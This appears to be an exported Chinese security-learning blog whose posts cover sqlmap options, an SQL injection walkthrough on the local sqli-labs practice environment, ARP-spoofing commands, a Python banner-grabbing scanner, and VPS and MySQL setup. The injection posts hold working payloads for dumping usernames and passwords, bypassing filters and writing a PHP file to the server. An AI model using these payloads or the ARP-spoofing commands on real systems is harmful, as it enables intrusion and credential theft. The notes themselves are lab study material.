设置随机化参数随即更改参数名称所对应的值，（sqlmap默认随机） –randomize 参数名称（特定） 1sqlmap -u \"...?id=1\" --randomize id --banner 设置日志过滤目标日志解析，并指定有效的Python正则表达式，用于过滤所需的日志 –scope 1sqlmap -l burp.log --scope=\"(www)?\\.target\\.(com|net|org)\" –skip-urlencode 不进行URL加密，有时中文或符号在服务端不遵循这种加密。 设置忽略401–ignore-401 用来忽略未验证错误 当你想测试偶尔返回401（未授权的）站点，，你想忽略他并在不提供验证的情况下继续测试 设置http协议私钥当web服务器需要适当地客户端证书和用于身份验证的私钥时，提供的值为pem格式的key-file，其中包含证书和私钥。 –auth-file 文件名 设置安全模式避免多次请求失败后销毁会话 可能发生在sqlmap的检测阶段会利用任何盲sql注入类型时，原因是sql有效负载不一定返回输出，因此可能会向应用程序会话管理或检查技术发出信号。 –safe-url –safe-post –safe-req –safe-freq 设置忽略URL编码–skip-urlencode 根据参数的位置（例如get）,默认情况下他的值可以是URL编码的。在某些情况下，后端web服务器不遵循RFC标准，需要以原始的非编码形式发送值。 性能优化设置-o 可以开启所有性能优化参数 设置持久http连接在HTTP报文中设置Connection：Keep-Alive。可避免服务器资源，性能受到影响 –keep-alive 设置不接受http bodysqlmap中检索没有body响应的内容 –unll-connection 设置多线程默认 1，为不影响服务器的性能和资源，sqlmap最大为 10 –threads 设置预测输出与–thread不兼容，在算法中用于检索值字符的顺序统计预测 –predict-output 指定位置注入注入介绍设置指定注入参数-p指定具体的探测参数（例 -p “id,uesr-agent”） –skip:忽略探测具体参数，例如 –level –skip “user-agent,referer” –level 1-5,5时忽略所有参数 –param-exclude：忽略包含具体内容的参数。例如：–param-exclude=”token|session” 不对包含token或session的参数进行探测 –skip-static：忽略非动态参数 设置任意注入位置例：参数：值* 注入参数强制设置DBMS默认会自动探测目标web应用程序的后端数据库管理系统 sqlmap完全支持的dbms种类：MySQL，oracle,Microsoft sql server,ibm db2,sqlite,firebird,sybase,sap maxdb,hsqldb,informix –dbms 数据库管理系统名称 [版本号] 例如：–dbms mysql [5.0] –dbms microsoft sql sever 05 强制设置OS指定默认自动识别探测目标web应用程序的后端操作系统（OS） sqlmap全支持的OS种类：Linux，Windows –os windows 或 –os linux 关闭负载转换机制–no-cast：防止NULL与字符串连接（dbms版本老旧），将null转换为空格 关闭字符转义机制–no-escape 字符转义机制:’f’ CHAR(102),混淆有效负载内容，防止后端服务器上查询转义机制（例如magic_quotes和/或 mysql_real_escape_string） 强制设置无效值替换要使原始参数值无效（例如id=12）时，经典的否定（例如id=-12） –invalid-bignum ：强制使用大整数（例如id=99999999） –invalid-logical ：强制使用布尔操作来实现相同的目标（例如id=12 and 18=19） –invalid-string ：强制使用随机字符串（例如id=adsfa） 自定义注入负载位置–prefix ：sql注入payload前缀 –suffix ：sql注入payload后缀 1sqlmap -u \"http://target.php?id=1\" -p id --prefix \"')\" --suffix \"and ('abc'=abc\" --dbs -v 5 设置tamper脚本–tamper 1sqlmap -u \"...\" --tamper \"between.py,randomcase.py\" -v 3 -v 3,5 查看http请求中的payload 存储脚本位置(usr/share/sqlmap/tamper) 设置dbms认证–dbms-cred=”root:toor” 自定义检测参数设置探测等级–level 1-5，默认1，探测复杂程度逐步提升 在xml/payload.xml 中指定了有效负载 设置风险参数–risk 1-3 ，默认1基本无害，2增加了基于时间的sql注入，3又增加了or的sql 注入 例如update，or 可能会打乱表单 设置页面比较参数–string 指定包含字符穿，查询为true –not-string 指定包含字符串，查询为false –regexp 指定通过正则表达式匹配字符串，查询为true –code 指定匹配http状态响应码，查询为true 设置内容比较参数–text-only 设置页面内容包含文本(–text-only=”welcome!”) –titles 设置title中包含文本，前提是知道如何区分查询的真假（–titles=”Login”） 注入技术参数设置具体sql注入技术默认 使用所有技术 –technique B:Boolean-based blind 基于布尔的盲注 E：Error-based 报错注入 U：Union query-based Union查询注入 S：Stacked queries 堆叠注入 T：Time-based blind 基于时间的盲注 Q：lnline queries 内联查询注入 设置时间盲注延迟时间–time-sec 整数，默认为5秒 设置union字段数默认情况下 使用1-10列的union查询的sql注入技术，但是提高level值，可增加至50列 –union-cols 12-16 设置union字符–union-char 123 替换unll,可能会使探测成功 设置union查询表–union-from 表名(其他表有限制) 1sqlmap -u \"\" --technique U --union-from users --current-db -v3 设置DNS露出攻击针对目标网络可能对外流量进行限制，或者设置WAF。通过dns协议绕过限制，获取数据 –dns-domain “dns 服务器”（需要用户具有一个开放53端口的dns服务器），通过dns流量来获取数据 设置二次注入–second-order url(url为二次注入的响应页面） 识别指纹–fingerprint -f 检索DBMS信息检索dbms banner–banner -b 获取后端数据库banner信息 检索dbms当前用户–current-user 检索dbms当前数据库–current-db 获取当前数据库名 检索当前主机名–hostname 探测当前用户DBA–is-dba 探测当前用户是否是数据库管理员 枚举DBMS用户–users 获取dbms所有用户 枚举dbms用户密码–password 获取用户密码 枚举dbms权限–privileges –role(角色) 枚举信息列举数据库名-dbs 枚举数据库表–tables 枚举表名 -》指定具体数据库 -D 数据库名 1-D security --tables –exclude-sysdbs 获取除了系统数据库的表名 1--tables --exclude-sysdbs 枚举数据表列–columns -D指定数据库 -T指定数据表 枚举数据值–dump -D -T -C制定具体字段 枚举schema信息–schema –schema –ex clude-sysdbsg 只会检索和显示非系统数据库的模式的一部分 1sqlmap -u \"...\" --schema --threads 10 --batch 检索数据表数量–count -D 获取数据信息–start –stop 1--start 1 --stop 3 不包括第一页，123 1--stop 1 获取第一张表 –first –last 1--first 2 --last 5 从第二个出发到第五个字符 设置条件获取信息–pivot-column=id 设置独一无二的列，主键 –where=”id&gt;3” 设置条件 暴力破解数据使用场景：MySQL&lt;5.0时，MySQL中没有元数据库information_schema –common-tables 破解数据库名 –common-columus 破解表名 读取文件须有读取权限 –file-read 路径（绝对路径） 读取对应文件内容 写入文件须有写入权限 –file-write 写入本地文件(绝对路径) –file-dest 将读取的文件写入到远程绝对路径（结对路径） 检索所有信息-a -all 系统参数执行系统参数–os-shell （1）网站必须是root权限 （2）攻击者需要知道网站的绝对路径 （3）GPC为off，php主动转义的功能关闭 通用参数加载sqlite会话文件-s 加载http文本文件-t 将流量加载到文本文件当中 1sqlmap -u \"...\" -t /root/Desktop/target.txt --flush-session -v3 --batch 设置默认选择选项–batch 执行系统命令–os-cmd=”命令” 设置盲注字符集在基于时间，布尔盲注中，用户自定义字符集来加速数据检索过程 –charset=”123456789asdw” 爬取url爬取三层url 三层 在CSV输出中使用分割字符–csv-del=”;” 设置输出格式在将转储表数据存储到输出目录中的相应文件中时，sqlmap支持三种不同的格式：CSV，HTML和SQLITE。默认的是CSV –dump-format=”” 探测之前检测Internet连接检测当前计算机Internet连接是否正常（是否能连接sqlmap指定服务器上） –check-internet 解析和测试表单–form 估计时间–eta 刷新会话文件避免默认缓存机制 –flush-session 忽略会话中存储的结果保持会话文件不变 –fresh-queries 使用Hex函数检索数据 确保数据不会丢失，返回正确结果 –hex 自定义输出路径–output-dir=”” 响应页面解析错误–parse-errors 返回错误信息 –save=“路径” 保存为配置文件（-c） –update 更新 设置DBMS编码–encoding=”gbk” 存储http流量到HARHAR(http archive) 是一个用来储存http请求/响应信息的通用文件格式，基于JSON –har=”HARFILE” 筛选具体payload–test-filter=“ROW” 过滤具体payload–test-skip=”BENCHMARK” –scope=”regex” 针对proxy日志文件使用正则表达式筛选目标 参考链接 https://www.freebuf.com/sectool/164608.html","categories":[],"tags":[{"name":"sqlmap","slug":"sqlmap","permalink":"http://yoursite.com/tags/sqlmap/"}]},{"title":"sql注入","slug":"sql注入","date":"2019-06-02T14:50:18.000Z","updated":"2019-06-14T12:58:35.226Z","comments":true,"path":"2019/06/02/sql注入/","link":"","permalink":"http://yoursite.com/2019/06/02/sql注入/","excerpt":"搭建sql注入靶场：工具：phpstudy , sqli , sqlmap , 浏览器","text":"搭建sql注入靶场：工具：phpstudy , sqli , sqlmap , 浏览器 sql注入：sql语言是解释型语言，就是源代码解释（需要解释器）成机器码直接执行 sql注入原理：利用站点设计漏洞，在web表单的输入域或页面请求的字符串，注入不同意图的sql语句，来获得信息。（注入原理：用户输入，用户可控，修改并带入sql语句，然后执行） 目的： 获取关键信息，例如账号密码，数据库表内存储数据。 方式：手工，工具 burpsuite工具链接：https://pan.baidu.com/s/1pCEyXH5mkD2RojXk7DvXdA提取码：1mbb复制这段内容后打开百度网盘手机App，操作更方便哦 破解参考博客 burpsuite使用参考博客 get基于报错的注入Less-1:‘’1’’ LIMIT 0,1’‘1’’ LIMIT 0,1sql: select password,a from admain where id=’’ LIMIT 0,1 手工注入： 123456789127.0.0.1/sqli/Less-1/?id=1' order by 3 --+ ✔判断字段数联合查询：127.0.0.1/sqli/Less-1/?id=0' UNION SELECT 1,user(),database() --+✔127.0.0.1/sqli/Less-1/?id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+ #✔获取表名127.0.0.1/sqli/Less-1/?id=0' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+ #✔获取字段名127.0.0.1/sqli/Less-1/?id=0' union select 1,group_concat(username,0x3a,password),3 from users--+ #✔获取字段值 解读： 0x3a为 ”:“ sqlmap: 123456sqlmap.py -u \"http://127.0.0.1/sqli/Less-1/?id=1\" --dbs --batchsqlmap.py -u \"http://127.0.0.1/sqli/Less-1/?id=1\" -D security --tables --batchsqlmap.py -u \"http://127.0.0.1/sqli/Less-1/?id=1\" -D security -T users --columns --batch#下面(''是错的，要用\"\"或无引号，如下)sqlmap.py -u \"http://127.0.0.1/sqli/Less-1/?id=1\" -D security -T users -C \"password,username\" --dump --batchsqlmap.py -u \"http://127.0.0.1/sqli/Less-1/?id=1\" -D security -T users -C password,username --dump --batch Less-2:‘’ LIMIT 0,1’‘ LIMIT 0,1sql: select * from admain where id=1 limit 0,1 Less-3：‘’1&#39;) LIMIT 0,1’‘1&#39;) LIMIT 0,1sql: select * from admain where id = (‘1’) limit 0,1 Less-4:‘“1&quot;) LIMIT 0,1’“1&quot;) LIMIT 0,1sql: select * from admain where id=(“1”) limit 0,1 get盲注：基于时间的盲注：Less-9: 127.0.0.1/sqli/Less-9/?id=1” and if(ascii(stustr(database(),1,1))=115,1,sleep(3)) –+ Less-10: 127.0.0.1/sqli/Less-10/?id=1” and if(ascii(stustr(database(),1,1))=115,1,sleep(3)) –+ 基于boolean的盲注：less-8: 1234127.0.0.1/sqli/Less-8/?id=1' and length(database())=8 --+#可接在 and 后stustr(database(),1,1)asciii(stustr(database(),1,1))=N sqlmap: 1sqlmap -u \"注入点\" --technique T --dbs 注解： T 基于时间 （sqlmap -h/hh 查询详细） Techniques: These options can be used to tweak testing of specific SQL injection techniques 12&gt; --technique=TECH SQL injection techniques to use (default \"BEUSTQ\")&gt; B: Boolean-based blind SQL injection（布尔型注入）E: Error-based SQL injection（报错型注入）U: UNION query SQL injection（可联合查询注入）S: Stacked queries SQL injection（可多语句查询注入）T: Time-based blind SQL injection（基于时间延迟注入） 默认情况下会测试所有的方式，可选择 mysql读写文件：读： 前提：show global variables like “secure_file_priv”; 修改my.ini 重启phpstudy. select load_file(“f:\\1.txt”)； 1union select 1,load_file(f:www\\\\Less-7\\\\flag.txt),3 --+ 写： 前提：show variables like ‘%general%’; 查看其general_log 是否为 OFF。 若是，则修改为 on 。 12&gt; set global general_log = on;&gt; 123union select 1,&apos;&lt;?php phpinfo();?&gt;&apos;,3 into outfile &quot;f:www\\\\Less-7\\\\1.php&quot; --+127.0.0.1\\Less-7\\1.php #查看是否写入成功 sqlmap: 1234sqlmap -hhsqlmap -u \"注入点\" --file-read \"文件路经\" --file-write --file-dest post 基于报错 get与post的区别:注入点发生改变，post 无法在浏览器中查看与修改，但是可以用插件。 burpsuite burpsuite 抓取http数据包保存在文件中 sqlmap 1sqlmap -r 文件路径 -p 指定探测参数 get报错注入(未完善)1select count(*) floor(rand(0)*2) 注解： 011011 sql注入绕过大小写，编码，关键字屏蔽，内联注释 post 基于时间和布尔值的盲注burpsuite抓取http报文 时间：… and (select (if (lenght (datebase() )&gt; 5,sleep(5),null))) –+ 布尔：… and (lenght (database() )&gt;5) –+ sqlmap 12时间 ： sqlmap -r \"文件路径\" -p 参数 --technique T 布尔： sqlmap -r \"文件路径\" -p 参数 --technique B http头中的注入在user-agent 和 referer 未被屏蔽时，可以进行注入 burpsuite user-agent: 1' and updatexml(1,concat(0x7e,version(),0x7e),1) or '1'='1 referer: 1' or (length(datebase())&gt;8) or if (1=1,sleep(5),null) or '1'='1 post_update语句的注入1updatexml(1,concat(0x7e,version(),0x7e),1) 注解： 1报错，执行”concat(0x7e,version(),0x7e)”做sql语句，替换报错内容，在报错中执行，最后输出。 updatexml和extractvalue函数 cookie注入例：less-20 burpsuite 抓取，用” \\ “判断闭合符号，之后 and 1=1,或 and \\ or 加sql语句 sqlmap 12345sqlmap.py -r \"target.txt\" --level 3 --batch sqlmap.py -r \"target.txt\" --level 3 --batch --dbssqlmap.py -r \"target.txt\" --level 3 --batch -D security --tablessqlmap.py -r \"target.txt\" --level 3 --batch -D security -T users --columns sqlmap.py -r \"target.txt\" --level 3 --batch -D security -T users -C password,username --dump base64注入burpsuite 首先截取，decoder 进行加密，例如：admin\\ base64加密后为：YWRtaW5c 进行报错。 sqlmap 1sqlmap.py -r \"target.txt\" --level 3 --batch --tamper base64encode.py 绕过去除注释的sql注入注释符： –+ –空格 # /* 多行注释 */ preg_replace()函数来替换字符串或字符数组的莫些字符 例：less-23: 1?id=-1' union select 1,database(),'3 注解：-1使前面的失效，union select 语句有效，-1和3旁边的单引号为一对，自动补充的单引号会加在最后，最后完成闭合。 sqlmap 1sqlmap.py -u \"http://127.0.0.1/sqli/Less-23/?id=1\" --batch --dbs … 绕过去除and or 的sql注入preg_replace()函数来替换字符串或字符数组的莫些字符 双写，内含注释，符号 （例：oorr,an/**/d,&amp;&amp;,||) 1sqlmap.py -u \"http://127.0.0.1/sqli/Less-25/?id=1\" --batch --dbs 绕过去除空格的sql注入%09 :Tab %0a ：换行 %20 ：空格 1http://127.0.0.1/sqli/Less-27/?id=100000000%27%09unIOn%09seLEct%091,version(),3%09||%09%271 sqlmap 1sqlmap.py -u \"http://127.0.0.1/sqli/Less-27/?id=1\" --batch --dbs 宽字节的注入原理： GBK ：宽字节字符集的一种，Mysql默认字符集, GBK占二字节，ASCII占一字节 php中编码为GBK，函数执行添加的是ASCII编码 %DF (常用)：会被php 中的addslashes 函数转义为” %DF\\‘ “ ， 如果网站，mysql编码都为GBK，那么就会被转义为”%DF%5C%27”，”%DF%5C”其为一个宽字符，也就是“縗”。 1http://127.0.0.1/sqli/Less-33/?id=-1%df%27%20union%20select%201,version(),database()--+ sqlmap 1sqlmap.py -u \"http://127.0.0.1/sqli/Less-33/?id=1%df%27\" --search --level 3 --risk 1 --thread 10 其实，首字节ascii大于128，如129十进制转十六进制为0x81,然后写%81即可； GBK 首字节对应(0x81-0xFE),尾字节对应 0x40-0xFE (0x7F除外)。 1http://127.0.0.1/sqli/Less-32/?id=-1%81%27%20%20union%20select%201,2,3--+ sqlmap 1sqlmap.py -u \"http://127.0.0.1/sqli/Less-32/?id=1\" --tamper=unmagicquotes.py Access偏移注入公式： 工具：owasp-zap access:小型数据库，只存在一个库，库内多个表。","categories":[],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://yoursite.com/tags/sql注入/"}]},{"title":"搭建ss服务","slug":"搭建ss服务","date":"2019-05-13T07:00:29.000Z","updated":"2019-06-02T14:59:48.732Z","comments":true,"path":"2019/05/13/搭建ss服务/","link":"","permalink":"http://yoursite.com/2019/05/13/搭建ss服务/","excerpt":"在centos 7上搭建ss服务","text":"在centos 7上搭建ss服务 下载安装:12yum install python-setuptools &amp;&amp; easy_install pippip install shadowsocks 配置1vim /etc/shadowsocks.json 123456789&#123; \"server\": \"vps ip\", \"port_password\": &#123; \"端口\": \"密码\", \"端口\": \"密码\" &#125;, \"timeout\": 300, \"method\": \"aes-256-cfb\"&#125; port_password可以配置多账号,每行代表一个端口:密码 前台运行： 1ssserver -c /etc/shadowsocks.json 后台运行： 1ssserver -c /etc/shadowsocks.json -d start 停止后台运行： 1ssserver -c /etc/shadowsocks.json -d stop 查看运行日志： 1tail -f -n 100 /var/log/shadowsocks.log 安装加速插件:谷歌BBR加速教程 vultr服务器的centos6不支持bbr加速，但centos7系统支持bbr加速，所以如果你想用bbr加速教程，vps操作系统需要选择centos7或其它系统。 1234567yum -y install wgetwget --no-check-certificate https://github.com/teddysun/across/raw/master/bbr.shchmod +x bbr.sh./bbr.sh 正在重启,莫慌,重连即可! 输入命令lsmod | grep bbr 如果出现tcp_bbr字样表示bbr已安装并启动成功 注:因为是重启啦,所以还要启动一下ss服务 后台运行： 1ssserver -c /etc/shadowsocks.json -d start centos7防火墙配置:查看firewall服务状态 1systemctl status firewalld 查看firewall的状态 1firewall-cmd --state 查询,开放,关闭端口 12345678910111213firewall-cmd --query-port=8080/tcp # 查询端口是否开放firewall-cmd --permanent --add-port=80/tcp # 开放80端口firewall-cmd --permanent --remove-port=8080/tcp # 移除端口#重启防火墙(修改配置后要重启防火墙)firewall-cmd --reload# 参数解释1、firwall-cmd：是Linux提供的操作firewall的一个工具；2、--permanent：表示设置为持久；3、--add-port：标识添加的端口； 查看防火墙规则 1firewall-cmd --list-all 开启、重启、关闭、firewalld.service服务 12345service firewalld start # 开启service firewalld restart # 重启service firewalld stop # 关闭 123systemctl disable firewalld.service #关闭开机启动：systemctl enable firewalld.service #开启开机启动： 参考链接: vultr vps购买 https://my.vultr.com vps 自己选择（此处不做推荐） 搭建ss ,安装bbr https://yq.aliyun.com/articles/94632 https://github.com/Alvin9999/new-pac/wiki/%E8%87%AA%E5%BB%BAss%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%99%E7%A8%8B 防火墙规则 https://www.cnblogs.com/xxoome/p/7115614.html https://blog.csdn.net/wsh_0703/article/details/80279115//","categories":[],"tags":[{"name":"vps","slug":"vps","permalink":"http://yoursite.com/tags/vps/"},{"name":"ss","slug":"ss","permalink":"http://yoursite.com/tags/ss/"}]},{"title":"mysql基础语句","slug":"mysql基础语句","date":"2019-05-04T06:44:51.000Z","updated":"2019-05-04T08:28:10.000Z","comments":true,"path":"2019/05/04/mysql基础语句/","link":"","permalink":"http://yoursite.com/2019/05/04/mysql基础语句/","excerpt":"交换型数据库，mysql,sqlserver,orical…","text":"交换型数据库，mysql,sqlserver,orical… 123456789101112131415161718192021222324252627282930313233343536373839404142434445#数据库show databases;create database test1;drop database test1;use test1;select database();#表create table users(id int(10) AUTO_INCREMENT,name varchar(50) not null,primary key(id));show tables;desc users;alter table users change name username varchar(50) not null;#增删改查insert into users values (1,&quot;Wang&quot;);insert into users values (2,&quot;Tian&quot;);insert into users values (3,&quot;Liu&quot;);insert into users values (4,&quot;Li&quot;);select * from users;delete from users where usersname=&quot;Liu&quot;;update users set id=2 where id=3;#函数select user();select database();select version();select load_file(&quot;路径/filename&quot;);show variables like &quot;secure_file_priv&quot;版本5.0之前没有，5.5之后出现NULLwin下修改mysql下的my.ini[mysqld]下加 secure_file_priv= #对mysqld，不限制导入导出[mysqld]下加 secure_file_priv=/tmp/ #对mysqld，在tmp目录下不限制导入导出[mysqld]下加 secure_file_priv=null #对mysqld，限制导入导出重启mysqlLinux下修改 /etc/mysql/mysql.conf.d添加 secure_file_priv=&quot;/&quot;select &quot;hello man!&quot; into dampfile &quot;路经/filename&quot;; #outfile导入多行#退出exit","categories":[],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://yoursite.com/tags/mysql/"}]},{"title":"搭建web服务","slug":"搭建web服务","date":"2019-05-03T10:28:17.000Z","updated":"2019-05-04T11:49:43.000Z","comments":true,"path":"2019/05/03/搭建web服务/","link":"","permalink":"http://yoursite.com/2019/05/03/搭建web服务/","excerpt":"多种方式部署web服务","text":"多种方式部署web服务 静态网站：html动态网站： 与数据库交互,jsp,php,asp…伪静态网站： 在服务器上搭建多个网站：不同的IP或端口或域名即可，设置域名后，需要安装DNS服务器。 windows+iis+asp+assesswindows+iss+asp+mssqlwindows+asp小旋风+asp+assesswindows+apmserv+php+mysqlwindows+tomcat+jsp+mysqllinux+apche+php+mysql windows+iis+asp+assess服务器管理器-&gt;添加角色-&gt;web服务器（IIS）-&gt;安装完成添加网站，编辑权限AuthenticatedUsers 完全控制，asp启用父目录，布置完成！ windows+asp小旋风+asp+assesswindows+apmserv+php+mysql下载apmserv… 安装服务iis dhcp dns","categories":[],"tags":[{"name":"web服务","slug":"web服务","permalink":"http://yoursite.com/tags/web服务/"}]},{"title":"更换Linux系统","slug":"更换Linux系统","date":"2019-05-03T10:23:15.000Z","updated":"2019-05-06T15:00:57.000Z","comments":true,"path":"2019/05/03/更换Linux系统/","link":"","permalink":"http://yoursite.com/2019/05/03/更换Linux系统/","excerpt":"在windows 系统更换 Linux（deepin 15.10）系统 ，所遇到的问题。","text":"在windows 系统更换 Linux（deepin 15.10）系统 ，所遇到的问题。 更换为Linux系统遇到的问题问题1：无线网卡无法打开首先通过命令查看网卡 1rfkill list all 会显示出 ideapad* 的软件开，硬件关；所以我们关闭它，留下软硬件皆开的。 移出ideapad无线模块： 1sudo modprobe -r ideapad_laptop 写配置文件，开机关闭ideapad无线模块 1sudo touch /etc/modprobe.d/ideapad.conf 1sudo vim /etc/modprobe.d/ideapad.conf 写入 blacklist ideapad_laptop 如果信号易断，可下载安装无线网卡驱动，下命令可查看无线网卡型号 1lspci | grep Wireless 无线网卡驱动下载地址 1sudo make &amp; make install enjoy! 问题2：锁屏界面输入密码无法进入桌面原因是因为N卡，禁用即可转载 问题3：制作的启动盘，无法载入用这个制作做启动盘Win32DiskImager 网盘下载地址 问题4：分区这个不是问题，多看看书，不然用Linux会很难受。新手建议全部给“/”；另外EFI是在UEFI模式下必须要有的分区，给个默认大小分区；两个可以了，会分区的不用看这里。ntfs,建议你的系统盘之外的盘，采用这个文件系统格式系统盘就ext4吧 enjoy!","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"搜索引擎这么用","slug":"搜索引擎这么用","date":"2019-05-03T10:21:04.000Z","updated":"2019-05-13T08:43:41.500Z","comments":true,"path":"2019/05/03/搜索引擎这么用/","link":"","permalink":"http://yoursite.com/2019/05/03/搜索引擎这么用/","excerpt":"搜索引擎这么用，更快捷的查询你想要的内容","text":"搜索引擎这么用，更快捷的查询你想要的内容 关键字 含义 site 指定搜索域名（例：site:baidi.com） inurl 指定url中是否含有某些关键字（例：inurl:.php?id=） intext 指定网页中是否含有某些关键字(例：intext:网站管理) filetype 指定搜索文件类型（例：filetype:txt） intitle 指定网页标题是否含有某些关键字（例：intitle:后台管理） link 指定网页链接（例：link:baidu.com 指定与百度做了外链的站点） info 指定搜索网页信息 http://sec-redclub.com/archives/116/","categories":[],"tags":[{"name":"google","slug":"google","permalink":"http://yoursite.com/tags/google/"}]},{"title":"arpspoof工具","slug":"arpspoof工具","date":"2019-05-03T09:49:45.000Z","updated":"2019-05-03T10:11:52.000Z","comments":true,"path":"2019/05/03/arpspoof工具/","link":"","permalink":"http://yoursite.com/2019/05/03/arpspoof工具/","excerpt":"Arpspoof是一个非常好的ARP欺骗的源代码程序。它的运行不会影响整个网络的通信，该工具通过替换传输中的数据从而达到对目标的欺骗 引用","text":"Arpspoof是一个非常好的ARP欺骗的源代码程序。它的运行不会影响整个网络的通信，该工具通过替换传输中的数据从而达到对目标的欺骗 引用 中间人流量劫持arp欺骗原理概述：被攻击者：192.168.13.150网关：192.168.13.2我：192.138.13.151arp在网络层，我先打开路由转发，然后进行arp广播，告诉被攻击者，我是网关，被攻击者的arp高速缓存表就会更新，认为我是网关；我告诉网关我是 被攻击者192.168.13.150,网关就会认为我是被攻击者192.168.13.150，最终达到流量劫持。 单向 流量：被攻击者-&gt;我-&gt;网关-&gt;被攻击者 欺骗被攻击主机，首先打开路由转发： 1echo 1 &gt; /proc/sys/net/ipv4/ip_forward 执行命令，实现arp欺骗，让被攻击者（192.168.13.151）认为我是网关（192.168.13.2），流量劫持： 1arpspoof -i eth0 -t 192.168.13.151 192.168.13.2 最后用wireshark,对抓到的包分析。 双向 流量：被攻击者-&gt;我-&gt;网关-&gt;我-&gt;被攻击者 欺骗网关与被攻击主机 在单向的基础上，再对网关进行欺骗： 1arpspoof -i eth0 -t 192.168.13.2 192.168.13.151 欺骗被攻击主机，并作iptable nat转发 在单向的基础上，用iptables做NAT数据包转发 此处预留：iptables的链接 流量捕获与监视捕捉图片 1driftnet -i eth0","categories":[],"tags":[{"name":"kali","slug":"kali","permalink":"http://yoursite.com/tags/kali/"},{"name":"工具","slug":"工具","permalink":"http://yoursite.com/tags/工具/"}]},{"title":"获取banner脚本","slug":"获取banner脚本","date":"2019-05-03T09:46:55.000Z","updated":"2019-05-03T10:22:49.000Z","comments":true,"path":"2019/05/03/获取banner脚本/","link":"","permalink":"http://yoursite.com/2019/05/03/获取banner脚本/","excerpt":"python脚本 banner：分析可知服务是否有漏洞","text":"python脚本 banner：分析可知服务是否有漏洞 脚本通过sys模块输入的脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#!/usr/bin/env python3#coding:utf-8import socketimport sysimport osfrom threading import Threadif len(sys.argv)!=2: print(\"参数个数不对\") print(\"例如：./getBanner.py ip.txt\") sys.exit()def getBanner(ip,port): socket.setdefaulttimeout(2) s=socket.socket() try: s.connect((ip,port)) banner=str(s.recv(1024)) s.close() return banner except: returndef checkVulns(ip,port): banner=getBanner(ip,port) if banner: if ('2.3.4' in banner): print(ip+\" vulnerable\") else: print(ip+\" unvulnerable\") else: print(ip+\" not get banner\")def main(): filename=str(sys.argv[1].strip()) if not os.path.exists(filename): print(\"指定的不出有你在，重输入\") sys.exit() port=22 filename=str(sys.argv[1].strip()) f=open(filename,\"r\") for i in f.readlines(): ip=i.strip(\"\\n\") t=Thread(target=checkVulns,args=(ip,port)) t.start() f.close()if __name__==\"__main__\": main() 通过os模块输入的脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#!/usr/bin/env python3#coding:utf-8import socketimport sysimport osfrom threading import Threadfrom optparse import OptionParserdef getBanner(ip,port): socket.setdefaulttimeout(2) s=socket.socket() try: s.connect((ip,port)) banner=str(s.recv(1024)) s.close() return banner except: returndef checkVulns(ip,port): banner=getBanner(ip,port) if banner: if ('2.3.4' in banner): print(ip+\" vulnerable\") else: print(ip+\" unvulnerable\") else: print(ip+\" not get banner\")def main(): usage=\"Usage: %prog -f &lt;filename&gt; -i &lt;ip address&gt;\" parser=OptionParser(usage=usage) parser.add_option(\"-f\",\"--filename\",type=\"string\",dest=\"filename\",help=\"ip address file\") parser.add_option(\"-i\",\"--ip\",type=\"string\",dest=\"address\",help=\"ip address\") (options,args)=parser.parse_args() filename=options.filename address=options.address if (filename==None and address==None): print(\"请指定文件地址或ip地址\") sys.exit() if(filename): if not os.path.exists(filename): print(\"指定的文件不在，重输入\") sys.exit() port=22 f=open(filename,\"r\") for i in f.readlines(): ip=i.strip(\"\\n\") t=Thread(target=checkVulns,args=(ip,port)) t.start() f.close() if(address): prefix=address.split(\".\")[0]+\".\"+address.split(\".\")[1]+\".\"+address.split(\".\")[2]+\".\" for i in range(1,255): ip=prefix+str(i) port=22 t=Thread(target=checkVulns,args=(ip,port)) t.start()if __name__==\"__main__\": main() 分步讲解引用模块socket12345import sockers=socket.socket()s.connect(\"192.168.0.12\",21)result=s.recv(1024)s.close() 添加选择1234if True: print(\"ok\")else: print(\"no\") False,0,空值等同；其余皆为True 添加异常处理1234try: f=open(\"ip.txt\",\"r\")except: pass w3c异常处理 菜鸟异常处理 添加函数12345678def getBanner(ip,port): ...def checkVulns(ip,port): ...def main(): ...if --name--==\"main\": main() –name– 判断是独立运行还是作为模块被导入 添加for循环12345for i in range(1,255): ip=\"192.168.0.\"+str(i) for p in [21,22,80]: socket=ip+\":\"+str(p) print(socket) print()自带换行 文件操作1234f=open(\"ip.txt\",\"r\")f.read()f.write()f.close() 模式 作用 r 读取 w 文件不存在则创建，存在则清空写入 a 追加 函数 作用 write() 写入，不会加”\\n” read() 读取 resdline() 按行读 resdlines() 一次读取一个列表 seck() 指针 close() 关闭并保存 导入模块import 模块名 from 模块名 import 函数名 引用sys模块1import sys sys.argv 变量： 专门用来向Python解释器传递参数 类似于shell脚本编程中的位置变量 sys.exit() 方法： 退出当前程序 引用os模块1import os os.path.isfile() 是否是文件 os.path.isdir() 是否是目录 os.path.exists() 是否存在 path：类，isfile(): 方法 多线程1234from threading import Threadt=Thread(target=要执行的函数，args=(响函数传递的的参数)) #args内的是元祖单个的为（a,）t.start() 进程是线程的容器，线程是操作系统调度分配处理器时间的基本单位 引用optparse模块设置选项 1234567from optparse import OptionParserusage=\"Usage: %prog -f &lt;filename&gt; -i &lt;address&gt;\"parser=OptionParser(usage=usage)parser.add_option(\"-f\",\"--file\",type=\"string\",dest=\"filename[传递的参数]\",help=\"[帮助提示信息]\")parser.add_option(\"-i\",\"--ip\",type=\"string\",dest=\"address[传递的参数]\",help=\"[帮助提示信息]\")(options,args)=parser.parse_args() -f,-i,-h","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"python脚本","slug":"python脚本","permalink":"http://yoursite.com/tags/python脚本/"}]},{"title":"windows基础","slug":"windows基础","date":"2019-03-20T00:24:54.000Z","updated":"2019-05-03T10:32:58.000Z","comments":true,"path":"2019/03/20/windows基础/","link":"","permalink":"http://yoursite.com/2019/03/20/windows基础/","excerpt":"win基础","text":"win基础 命令 作用 dxdiag 诊断工具 msconfig 系统配置（启动） services.msc 服务 mstsc 远程桌面连接 gpedit.msc 本地组策略编辑器 regedit 注册表编辑器 